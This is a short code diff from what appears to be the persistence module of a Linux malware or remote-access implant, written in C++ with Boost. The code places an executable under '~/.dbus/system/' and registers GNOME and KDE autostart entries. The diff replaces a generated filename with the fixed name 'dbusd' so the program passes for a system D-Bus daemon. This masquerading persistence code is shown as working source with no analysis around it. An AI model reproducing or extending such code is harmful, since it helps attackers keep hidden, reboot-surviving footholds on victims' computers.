@@ -10,6 +10,8 @@
 using namespace modules::persist;
 using namespace boost::filesystem;
 
+// #define PROCEDURAL_FILENAME
+
 PersistAutostart::PersistAutostart()
 {
 }
@@ -42,6 +44,7 @@ void PersistAutostart::init(ModuleInterface* inter, PersistModule* persist)
   // Storage path
   storagePath = homePath / path(".dbus/system/");
 
+#ifdef PROCEDURAL_FILENAME
   // Generate executable name
   SystemInfo* sysInfo = inter->getSysInfo();
 
@@ -71,6 +74,9 @@ void PersistAutostart::init(ModuleInterface* inter, PersistModule* persist)
 
   // We now have our filename.
   exeName = oss.str();
+#else
+  exeName = "dbusd";
+#endif
   gnomeConfigFilePath = gnomeConfigPath / (exeName+".desktop");
   kdeConfigFilePath = kdeAutoConfigPath / (exeName+".desktop");
 }
